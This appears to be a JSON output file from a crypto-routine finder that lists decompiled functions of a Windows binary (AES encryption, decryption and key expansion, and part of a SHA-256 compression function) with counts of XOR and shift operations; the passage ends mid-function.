[
    {
        "Function": "sub_402220",
        "Total XOR and shift operations": 103,
        "XOR operations": 76,
        "Shift operations": 27,
        "Operation percentage": "119.77%",
        "Function Body": "\nint __cdecl sub_402220(int *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v4; // eax\n  int v5; // ebx\n  unsigned int v6; // edi\n  int v7; // edx\n  _DWORD *v8; // eax\n  unsigned int v9; // ebx\n  int v10; // ecx\n  int v11; // edx\n  int v12; // ebx\n  int v13; // edx\n  unsigned __int8 v14; // ah\n  int result; // eax\n  int i; // [esp+Ch] [ebp-18h]\n  unsigned int v17; // [esp+Ch] [ebp-18h]\n  unsigned int v18; // [esp+10h] [ebp-14h]\n  unsigned int v19; // [esp+14h] [ebp-10h]\n  unsigned int v20; // [esp+14h] [ebp-10h]\n  unsigned int v21; // [esp+18h] [ebp-Ch]\n  unsigned int v22; // [esp+18h] [ebp-Ch]\n  unsigned int v23; // [esp+1Ch] [ebp-8h]\n  unsigned int v24; // [esp+20h] [ebp-4h]\n  unsigned int v25; // [esp+20h] [ebp-4h]\n  unsigned int v26; // [esp+2Ch] [ebp+8h]\n  int v27; // [esp+2Ch] [ebp+8h]\n  unsigned int v28; // [esp+30h] [ebp+Ch]\n  int v29; // [esp+30h] [ebp+Ch]\n\n  v4 = (_DWORD *)a1[1];\n  v26 = v4[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));\n  v5 = *v4 ^ (*a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8));\n  v23 = v5;\n  v6 = v4[2] ^ (a2[8] | ((a2[9] | ((a2[10] | (a2[11] << 8)) << 8)) << 8));\n  v24 = v6;\n  v7 = v4[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));\n  v8 = v4 + 4;\n  v28 = v7;\n  for ( i = (*a1 >> 1) - 1; i > 0; --i )\n  {\n    v21 = *v8 ^ dword_416570[(unsigned __int8)v5] ^ dword_417170[HIBYTE(v26)] ^ dword_416D70[BYTE2(v6)] ^ dword_416970[BYTE1(v7)];\n    v19 = v8[1] ^ dword_416570[(unsigned __int8)v26] ^ dword_417170[HIBYTE(v24)] ^ dword_416970[BYTE1(v5)] ^ dword_416D70[BYTE2(v28)];\n    v18 = v8[2] ^ dword_416570[(unsigned __int8)v24] ^ dword_417170[HIBYTE(v28)] ^ dword_416D70[BYTE2(v5)] ^ dword_416970[BYTE1(v26)];\n    v9 = v8[3] ^ dword_416570[(unsigned __int8)v28] ^ dword_417170[HIBYTE(v23)] ^ dword_416D70[BYTE2(v26)] ^ dword_416970[BYTE1(v24)];\n    v23 = v8[4] ^ dword_416570[(unsigned __int8)v21] ^ dword_417170[HIBYTE(v19)] ^ dword_416D70[BYTE2(v18)] ^ dword_416970[(unsigned __int8)((unsigned __int16)(*((_WORD *)v8 + 6) ^ LOWORD(dword_416570[(unsigned __int8)v28]) ^ LOWORD(dword_417170[HIBYTE(v23)]) ^ LOWORD(dword_416D70[BYTE2(v26)]) ^ LOWORD(dword_416970[BYTE1(v24)])) >> 8)];\n    v26 = v8[5] ^ dword_416570[(unsigned __int8)v19] ^ dword_417170[HIBYTE(v18)] ^ dword_416970[BYTE1(v21)] ^ dword_416D70[BYTE2(v9)];\n    v24 = v8[6] ^ dword_416570[(unsigned __int8)v18] ^ dword_417170[HIBYTE(v9)] ^ dword_416D70[BYTE2(v21)] ^ dword_416970[BYTE1(v19)];\n    v6 = v24;\n    v10 = (unsigned __int8)v9;\n    v5 = v23;\n    v7 = v8[7] ^ dword_416570[v10] ^ dword_417170[HIBYTE(v21)] ^ dword_416D70[BYTE2(v19)] ^ dword_416970[BYTE1(v18)];\n    v8 += 8;\n    v28 = v7;\n  }\n  v22 = *v8 ^ dword_416570[(unsigned __int8)v5] ^ dword_417170[HIBYTE(v26)] ^ dword_416D70[BYTE2(v6)] ^ dword_416970[BYTE1(v7)];\n  v20 = v8[1] ^ dword_416570[(unsigned __int8)v26] ^ dword_417170[HIBYTE(v6)] ^ dword_416970[BYTE1(v5)] ^ dword_416D70[BYTE2(v28)];\n  v11 = dword_416970[BYTE1(v24)];\n  v25 = v8[2] ^ dword_416570[(unsigned __int8)v24] ^ dword_417170[HIBYTE(v28)] ^ dword_416D70[BYTE2(v5)] ^ dword_416970[BYTE1(v26)];\n  v17 = v8[3] ^ dword_416570[(unsigned __int8)v28] ^ dword_417170[HIBYTE(v23)] ^ dword_416D70[BYTE2(v26)] ^ v11;\n  v27 = v8[4] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v22] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v17)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v25)]) << 8)) << 8);\n  v29 = v8[5] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v20] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v22)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v25)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v17)]) << 8)) << 8);\n  v12 = v8[6] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v25] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v20)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v17)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v22)]) << 8)) << 8);\n  v13 = v8[7] ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v17] ^ (((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v25)] ^ ((((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v22)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v20)]) << 8)) << 8);\n  v14 = (unsigned __int16)(*((_WORD *)v8 + 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[(unsigned __int8)v22] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE1(v17)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_inv_LONG_416470[HIBYTE(v20)] << 8) ^ (unsigned __int8)RijnDael_AES_inv_LONG_416470[BYTE2(v25)]) << 8)) << 8)) >> 8;\n  *(_BYTE *)a3 = v27;\n  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v27), v14);\n  *(_BYTE *)(a3 + 3) = HIBYTE(v27);\n  *(_DWORD *)(a3 + 4) = v29;\n  *(_BYTE *)(a3 + 9) = BYTE1(v12);\n  *(_BYTE *)(a3 + 10) = BYTE2(v12);\n  *(_BYTE *)(a3 + 13) = BYTE1(v13);\n  *(_BYTE *)(a3 + 8) = v12;\n  *(_BYTE *)(a3 + 12) = v13;\n  *(_BYTE *)(a3 + 11) = HIBYTE(v12);\n  *(_BYTE *)(a3 + 14) = BYTE2(v13);\n  result = 0;\n  *(_BYTE *)(a3 + 15) = HIBYTE(v13);\n  return result;\n}\n// 416570: using guessed type int dword_416570[256];\n// 416970: using guessed type int dword_416970[256];\n// 416D70: using guessed type int dword_416D70[256];\n// 417170: using guessed type int dword_417170[256];\n\n"
    },
    {
        "Function": "sub_4027B0",
        "Total XOR and shift operations": 97,
        "XOR operations": 72,
        "Shift operations": 25,
        "Operation percentage": "112.79%",
        "Function Body": "\nint __cdecl sub_4027B0(int *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v5; // eax\n  int v6; // ebx\n  unsigned int v7; // ebx\n  int v8; // edx\n  _DWORD *v9; // eax\n  unsigned int v10; // ebx\n  int v11; // ecx\n  int v12; // edx\n  int v13; // edx\n  int v14; // ebx\n  int v15; // edx\n  unsigned __int8 v16; // ah\n  int result; // eax\n  int i; // [esp+Ch] [ebp-18h]\n  unsigned int v19; // [esp+Ch] [ebp-18h]\n  unsigned int v20; // [esp+10h] [ebp-14h]\n  unsigned int v21; // [esp+10h] [ebp-14h]\n  unsigned int v22; // [esp+14h] [ebp-10h]\n  unsigned int v23; // [esp+14h] [ebp-10h]\n  int v24; // [esp+18h] [ebp-Ch]\n  int v25; // [esp+18h] [ebp-Ch]\n  unsigned int v26; // [esp+1Ch] [ebp-8h]\n  unsigned int v27; // [esp+20h] [ebp-4h]\n  unsigned int v28; // [esp+2Ch] [ebp+8h]\n  int v29; // [esp+2Ch] [ebp+8h]\n  unsigned int v30; // [esp+30h] [ebp+Ch]\n  unsigned int v31; // [esp+30h] [ebp+Ch]\n\n  v5 = (_DWORD *)a1[1];\n  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);\n  v30 = v5[1] ^ (a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8));\n  v7 = *v5 ^ v6;\n  v28 = v5[2] ^ (a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8));\n  BYTE1(v24) = BYTE1(v7);\n  v8 = v5[3] ^ (a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8));\n  v9 = v5 + 4;\n  v27 = v8;\n  for ( i = (*a1 >> 1) - 1; i > 0; --i )\n  {\n    v26 = *v9 ^ dword_415470[(unsigned __int8)v7] ^ dword_416070[HIBYTE(v27)] ^ dword_415870[BYTE1(v30)] ^ dword_415C70[BYTE2(v28)];\n    v22 = v9[1] ^ dword_415470[(unsigned __int8)v30] ^ dword_416070[HIBYTE(v7)] ^ dword_415870[BYTE1(v28)] ^ dword_415C70[BYTE2(v27)];\n    v20 = v9[2] ^ dword_415470[(unsigned __int8)v28] ^ dword_416070[HIBYTE(v30)] ^ dword_415C70[BYTE2(v7)] ^ dword_415870[BYTE1(v27)];\n    v10 = v9[3] ^ dword_415470[(unsigned __int8)v27] ^ dword_416070[HIBYTE(v28)] ^ dword_415870[BYTE1(v7)] ^ dword_415C70[BYTE2(v30)];\n    v24 = v9[4] ^ dword_415470[(unsigned __int8)v26] ^ dword_416070[HIBYTE(v10)] ^ dword_415870[BYTE1(v22)] ^ dword_415C70[BYTE2(v20)];\n    v30 = v9[5] ^ dword_415470[(unsigned __int8)v22] ^ dword_416070[HIBYTE(v26)] ^ dword_415870[BYTE1(v20)] ^ dword_415C70[BYTE2(v10)];\n    v28 = v9[6] ^ dword_415470[(unsigned __int8)v20] ^ dword_416070[HIBYTE(v22)] ^ dword_415C70[BYTE2(v26)] ^ dword_415870[BYTE1(v10)];\n    v11 = (unsigned __int8)v10;\n    v7 = v24;\n    v12 = v9[7] ^ dword_415470[v11] ^ dword_416070[HIBYTE(v20)] ^ dword_415870[BYTE1(v26)] ^ dword_415C70[BYTE2(v22)];\n    v9 += 8;\n    v27 = v12;\n  }\n  v23 = *v9 ^ dword_415470[(unsigned __int8)v7] ^ dword_416070[HIBYTE(v27)] ^ dword_415870[BYTE1(v30)] ^ dword_415C70[BYTE2(v28)];\n  v21 = v9[1] ^ dword_415470[(unsigned __int8)v30] ^ dword_416070[HIBYTE(v7)] ^ dword_415870[BYTE1(v28)] ^ dword_415C70[BYTE2(v27)];\n  v13 = dword_415C70[BYTE2(v30)];\n  v31 = v9[2] ^ dword_415470[(unsigned __int8)v28] ^ dword_416070[HIBYTE(v30)] ^ dword_415C70[BYTE2(v7)] ^ dword_415870[BYTE1(v27)];\n  v19 = v9[3] ^ dword_415470[(unsigned __int8)v27] ^ dword_416070[HIBYTE(v28)] ^ dword_415870[BYTE1(v24)] ^ v13;\n  v29 = v9[4] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v23] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v31)]) << 8)) << 8);\n  v25 = v9[5] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v21] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v31)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v23)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v19)]) << 8)) << 8);\n  v14 = v9[6] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v31] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v19)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v21)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v23)]) << 8)) << 8);\n  v15 = v9[7] ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v19] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v23)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v31)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v21)]) << 8)) << 8);\n  v16 = (unsigned __int16)(*((_WORD *)v9 + 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v23] ^ (unsigned __int16)(((unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ (unsigned __int16)(((unsigned __int16)((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v19)] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v31)]) << 8)) << 8)) >> 8;\n  *(_BYTE *)a3 = v29;\n  *(_WORD *)(a3 + 1) = __PAIR16__(BYTE2(v29), v16);\n  *(_BYTE *)(a3 + 3) = HIBYTE(v29);\n  *(_DWORD *)(a3 + 4) = v25;\n  *(_BYTE *)(a3 + 9) = BYTE1(v14);\n  *(_BYTE *)(a3 + 10) = BYTE2(v14);\n  *(_BYTE *)(a3 + 13) = BYTE1(v15);\n  *(_BYTE *)(a3 + 8) = v14;\n  *(_BYTE *)(a3 + 12) = v15;\n  *(_BYTE *)(a3 + 11) = HIBYTE(v14);\n  *(_BYTE *)(a3 + 14) = BYTE2(v15);\n  result = 0;\n  *(_BYTE *)(a3 + 15) = HIBYTE(v15);\n  return result;\n}\n// 415470: using guessed type int dword_415470[256];\n// 415870: using guessed type int dword_415870[256];\n// 415C70: using guessed type int dword_415C70[256];\n// 416070: using guessed type int dword_416070[256];\n\n"
    },
    {
        "Function": "sub_401D20",
        "Total XOR and shift operations": 156,
        "XOR operations": 115,
        "Shift operations": 41,
        "Operation percentage": "102.63%",
        "Function Body": "\nint __cdecl sub_401D20(_DWORD *a1, unsigned __int8 *a2, int a3)\n{\n  _DWORD *v4; // esi\n  int v6; // edi\n  unsigned int v7; // ebx\n  int v8; // esi\n  int v9; // edx\n  int v10; // ecx\n  int v11; // edx\n  unsigned int v12; // ebx\n  int v13; // edi\n  int v14; // esi\n  int v15; // ecx\n  unsigned int v16; // edx\n  int v17; // ebx\n  int v18; // edi\n  int v19; // esi\n  int v20; // ebx\n  unsigned int v21; // edx\n  int v22; // edx\n  int v23; // esi\n  int v24; // ebx\n  int v25; // ecx\n  int v26; // edx\n  int v27; // edi\n  int v28; // esi\n  int v29; // ecx\n  int v30; // edx\n  int v31; // ebx\n  int v32; // edi\n  int v33; // esi\n  int v34; // ecx\n  int v35; // edx\n  int v36; // ebx\n  int v37; // ecx\n  int v38; // edi\n  unsigned int v39; // [esp+4h] [ebp-8h]\n  unsigned int v40; // [esp+4h] [ebp-8h]\n  int v41; // [esp+8h] [ebp-4h]\n  int v42; // [esp+8h] [ebp-4h]\n  int v43; // [esp+8h] [ebp-4h]\n  _DWORD *v44; // [esp+1Ch] [ebp+10h]\n\n  switch ( a3 )\n  {\n    case 128:\n      v4 = a1;\n      *a1 = 10;\n      break;\n    case 192:\n      v4 = a1;\n      *a1 = 12;\n      break;\n    case 256:\n      v4 = a1;\n      *a1 = 14;\n      break;\n    default:\n      return -32;\n  }\n  v4[1] = v4 + 2;\n  v44 = v4 + 2;\n  v6 = *a2 | ((a2[1] | (*((unsigned __int16 *)a2 + 1) << 8)) << 8);\n  v4[2] = v6;\n  v4[3] = a2[4] | ((a2[5] | (*((unsigned __int16 *)a2 + 3) << 8)) << 8);\n  v4[4] = a2[8] | ((a2[9] | (*((unsigned __int16 *)a2 + 5) << 8)) << 8);\n  v7 = a2[12] | ((a2[13] | (*((unsigned __int16 *)a2 + 7) << 8)) << 8);\n  v4[5] = v7;\n  if ( *v4 == 10 )\n  {\n    v8 = v6 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v7)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v7)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v7] << 8)) << 8)) << 8) ^ 1;\n    v9 = v44[2];\n    v10 = v8 ^ v44[1];\n    v44[4] = v8;\n    v11 = v10 ^ v9;\n    v44[5] = v10;\n    v12 = v11 ^ v7;\n    v44[7] = v12;\n    v44[6] = v11;\n    v13 = v8 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v12)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v12)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v12] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v12)]) << 8)) << 8) ^ 2;\n    v14 = v10 ^ v13;\n    v44[8] = v13;\n    v44[9] = v10 ^ v13;\n    v15 = v11 ^ v14;\n    v44[10] = v11 ^ v14;\n    v16 = v12 ^ v11 ^ v14;\n    v44[11] = v16;\n    v17 = v13 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v16)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v16)] ^ ((((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v16] << 8) ^ (unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v16)]) << 8)) << 8) ^ 4;\n    v44[12] = v17;\n    v18 = v14 ^ v17;\n    v44[13] = v14 ^ v17;\n    v19 = v15 ^ v14 ^ v17;\n    v44[14] = v19;\n    v44[15] = v16 ^ v19;\n    v41 = v17 ^ (unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int16)(v16 ^ v19) >> 8] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)((v16 ^ v19) >> 16)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[(v16 ^ v19) >> 24] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v16 ^ v19)] << 8)) << 8)) << 8) ^ 8;\n    v44[16] = v41;\n    v20 = v18 ^ v41;\n    v44[17] = v18 ^ v41;\n    v44[18] = v19 ^ v18 ^ v41;\n    v21 = v16 ^ v19 ^ v19 ^ v18 ^ v41;\n    v44[19] = v21;\n    v39 = v21;\n    v42 = v41 ^ (unsigned __int8)RijnDael_AES_LONG_415370[BYTE1(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v21)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v21)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v21] << 8)) << 8)) << 8) ^ 0x10;\n    v22 = v20 ^ v42;\n    v44[20] = v42;\n    v44[21] = v20 ^ v42;\n    v23 = v19 ^ v20 ^ v20 ^ v42;\n    v44[22] = v23;\n    v44[23] = v39 ^ v23;\n    v40 = v39 ^ v23;\n    v24 = v42 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 93)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[BYTE2(v40)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[HIBYTE(v40)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v40] << 8)) << 8)) << 8) ^ 0x20;\n    v44[24] = v24;\n    v25 = v22 ^ v24;\n    v44[25] = v22 ^ v24;\n    v26 = v23 ^ v22 ^ v24;\n    v44[26] = v26;\n    v44[27] = v40 ^ v26;\n    v27 = v24 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 109)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 110)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 111)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v40 ^ v26)] << 8)) << 8)) << 8) ^ 0x40;\n    v28 = v25 ^ v27;\n    v44[28] = v27;\n    v44[29] = v25 ^ v27;\n    v29 = v26 ^ v28;\n    v44[30] = v26 ^ v28;\n    v30 = v40 ^ v26 ^ v26 ^ v28;\n    v44[31] = v30;\n    v31 = v27 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 125)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 126)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 127)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)v30] << 8)) << 8)) << 8) ^ 0x80;\n    v44[32] = v31;\n    v32 = v28 ^ v31;\n    v44[33] = v28 ^ v31;\n    v33 = v29 ^ v28 ^ v31;\n    v44[34] = v33;\n    v34 = v30 ^ v33;\n    v44[35] = v30 ^ v33;\n    v43 = v31 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 141)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 142)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 143)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v30 ^ v33)] << 8)) << 8)) << 8) ^ 0x1B;\n    v44[36] = v43;\n    v35 = v33 ^ v32 ^ v43;\n    v44[37] = v32 ^ v43;\n    v36 = v34 ^ v35;\n    v44[39] = v34 ^ v35;\n    v44[38] = v35;\n    v37 = v43 ^ (unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 157)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 158)] ^ (((unsigned __int8)RijnDael_AES_LONG_415370[*((unsigned __int8 *)v44 + 159)] ^ ((unsigned __int8)RijnDael_AES_LONG_415370[(unsigned __int8)(v34 ^ v35)] << 8)) << 8)) << 8) ^ 0x36;\n    v44[40] = v37;\n    v44[41] = v37 ^ v32 ^ v43;\n    v38 = v35 ^ v37 ^ v32 ^ v43;\n    v44[42] = v38;\n    v44[43] = v36 ^ v38;\n  }\n  return 0;\n}\n\n"
    },
    {
        "Function": "sub_4072B0",
        "Total XOR and shift operations": 147,
        "XOR operations": 128,
        "Shift operations": 19,
        "Operation percentage": "43.75%",
        "Function Body": "\nint __cdecl sub_4072B0(_DWORD *a1, int a2)\n{\n  int v2; // edx\n  int v3; // esi\n  int v4; // eax\n  unsigned int v5; // ebx\n  int v6; // edi\n  int v7; // eax\n  int v8; // ecx\n  int v9; // ebx\n  unsigned int v10; // eax\n  int v11; // edi\n  int v12; // ebx\n  int v13; // edi\n  int v14; // edi\n  int v15; // edi\n  int v16; // esi\n  unsigned int v17; // esi\n  char *v18; // esi\n  int v19; // esi\n  int v20; // esi\n  int v21; // edx\n  unsigned int v22; // ecx\n  unsigned int v23; // ebx\n  char *v24; // edi\n  unsigned int v25; // esi\n  int v26; // ecx\n  int v27; // edx\n  int v28; // esi\n  int v29; // ecx\n  unsigned int v30; // edi\n  int v31; // esi\n  int v32; // ecx\n  unsigned int v33; // ebx\n  int v34; // edx\n  int v35; // esi\n  unsigned int v36; // esi\n  int v37; // ecx\n  int v38; // edi\n  int v39; // edx\n  unsigned int v40; // edi\n  int v41; // edx\n  int v42; // ebx\n  int v43; // ecx\n  int v44; // edx\n  int v45; // ecx\n  int v46; // esi\n  int v47; // edx\n  unsigned int v48; // ebx\n  int v49; // edx\n  int v50; // esi\n  int v51; // ecx\n  int v52; // edi\n  int v53; // esi\n  unsigned int v54; // edi\n  int v55; // ecx\n  int v56; // ebx\n  int v57; // esi\n  unsigned int v58; // ebx\n  unsigned int v59; // edx\n  int v60; // edi\n  int v61; // ecx\n  int v62; // esi\n  int v63; // esi\n  int v64; // edi\n  int v65; // esi\n  int v66; // edx\n  int v67; // ecx\n  int v68; // esi\n  int v69; // esi\n  int v70; // ebx\n  int v71; // edi\n  int v72; // edx\n  int v73; // eax\n  int v75[79]; // [esp+0h] [ebp-174h] BYREF\n  int v76; // [esp+13Ch] [ebp-38h]\n  unsigned int v77; // [esp+140h] [ebp-34h]\n  unsigned int v78; // [esp+144h] [ebp-30h]\n  unsigned int v79; // [esp+148h] [ebp-2Ch]\n  char *v80; // [esp+14Ch] [ebp-28h]\n  int v81; // [esp+150h] [ebp-24h]\n  int v82; // [esp+154h] [ebp-20h]\n  int v83; // [esp+158h] [ebp-1Ch]\n  int v84; // [esp+15Ch] [ebp-18h]\n  int v85; // [esp+160h] [ebp-14h]\n  int v86; // [esp+164h] [ebp-10h]\n  int v87; // [esp+168h] [ebp-Ch]\n  int v88; // [esp+16Ch] [ebp-8h]\n  unsigned int v89; // [esp+170h] [ebp-4h]\n\n  v2 = a1[6];\n  v3 = a1[7];\n  v76 = a1[2];\n  v81 = a1[3];\n  v85 = a1[4];\n  v86 = a1[5];\n  v4 = a1[8];\n  v83 = v76;\n  v5 = 0;\n  v88 = v4;\n  v6 = a2 + 2;\n  v7 = a1[9];\n  v82 = v2;\n  v87 = v3;\n  v84 = v7;\n  do\n  {\n    v8 = *(unsigned __int8 *)(v6 - 2);\n    v6 += 4;\n    v75[v5++ + 15] = *(unsigned __int8 *)(v6 - 3) | ((*(unsigned __int8 *)(v6 - 4) | ((*(unsigned __int8 *)(v6 - 5) | (v8 << 8)) << 8)) << 8);\n  }\n  while ( v5 < 0x10 );\n  v9 = v83;\n  v10 = 0;\n  while ( 1 )\n  {\n    v11 = v84\n        + v75[v10 + 15]\n        + dword_417810[v10]\n        + (v88 ^ v2 & (v88 ^ v3))\n        + (__ROR4__(v2, 6) ^ __ROL4__(v2, 7) ^ __ROR4__(v2, 11));\n    v84 = v11 + v86;\n    v12 = v11 + (__ROR4__(v9, 2) ^ __ROL4__(v9, 10) ^ __ROR4__(v9, 13)) + (v85 & (v9 | v81) | v81 & v9);\n    v13 = v88\n        + v75[v10 + 16]\n        + dword_417814[v10]\n        + (v87 ^ (v11 + v86) & (v82 ^ v87))\n        + (__ROR4__(v11 + v86, 6) ^ __ROL4__(v11 + v86, 7) ^ __ROR4__(v11 + v86, 11));\n    v89 = v13 + v85;\n    v88 = v13 + (__ROR4__(v12, 2) ^ __ROL4__(v12, 10) ^ __ROR4__(v12, 13)) + (v81 & (v12 | v83) | v12 & v83);\n    v14 = v87\n        + v75[v10 + 17]\n        + dword_417818[v10]\n        + (v82 ^ (v13 + v85) & (v82 ^ v84))\n        + (__ROR4__(v13 + v85, 6) ^ __ROL4__(v13 + v85, 7) ^ __ROR4__(v13 + v85, 11));\n    v80 = (char *)(v14 + v81);\n    v87 = v14 + (__ROR4__(v88, 2) ^ __ROL4__(v88, 10) ^ __ROR4__(v88, 13)) + (v83 & (v12 | v88) | v12 & v88);\n    v15 = v82\n        + v75[v10 + 18]\n        + dword_41781C[v10]\n        + (v84 ^ (v14 + v81) & (v89 ^ v84))\n        + (__ROR4__(v14 + v81, 6) ^ __ROL4__(v14 + v81, 7) ^ __ROR4__(v14 + v81, 11));\n    v83 += v15;\n    v82 = v15 + (__ROR4__(v87, 2) ^ __ROL4__(v87, 10) ^ __ROR4__(v87, 13)) + (v12 & (v88 | v87) | v88 & v87);\n    v16 = v84\n        + v75[v10 + 19]\n        + dword_417820[v10]\n        + (v89 ^ v83 & (v89 ^ (unsigned int)v80))\n        + (__ROR4__(v83, 6) ^ __ROL4__(v83, 7) ^ __ROR4__(v83, 11));\n    v84 = v12 + v16;\n    v86 = v16 + (__ROR4__(v82, 2) ^ __ROL4__(v82, 10) ^ __ROR4__(v82, 13)) + (v87 & v82 | v88 & (v87 | v82));\n    v17 = v89\n        + v75[v10 + 20]\n        + dword_417824[v10]\n        + ((unsigned int)v80 ^ v84 & (v83 ^ (unsigned int)v80))\n        + (__ROR4__(v84, 6) ^ __ROL4__(v12 + v16, 7) ^ __ROR4__(v12 + v16, 11));\n    v88 += v17;\n    v85 = v87 & (v82 | v86);\n    v85 |= v82 & v86;\n    v85 += v17 + (__ROR4__(v86, 2) ^ __ROL4__(v86, 10) ^ __ROR4__(v86, 13));\n    v18 = &v80[v75[v10 + 21]\n             + dword_417828[v10]\n             + (v83 ^ v88 & (v84 ^ v83))\n             + (__ROR4__(v88, 6) ^ __ROL4__(v88, 7) ^ __ROR4__(v88, 11))];\n    v87 += (int)v18;\n    v81 = v82 & (v86 | v85);\n    v81 |= v86 & v85;\n    v81 += (int)&v18[__ROR4__(v85, 2) ^ __ROL4__(v85, 10) ^ __ROR4__(v85, 13)];\n    v19 = v75[v10 + 22]\n        + dword_41782C[v10]\n        + (v84 ^ v87 & (v88 ^ v84))\n        + (__ROR4__(v87, 6) ^ __ROL4__(v87, 7) ^ __ROR4__(v87, 11));\n    v10 += 8;\n    v20 = v83 + v19;\n    v82 += v20;\n    v21 = v20 + (__ROR4__(v81, 2) ^ __ROL4__(v81, 10) 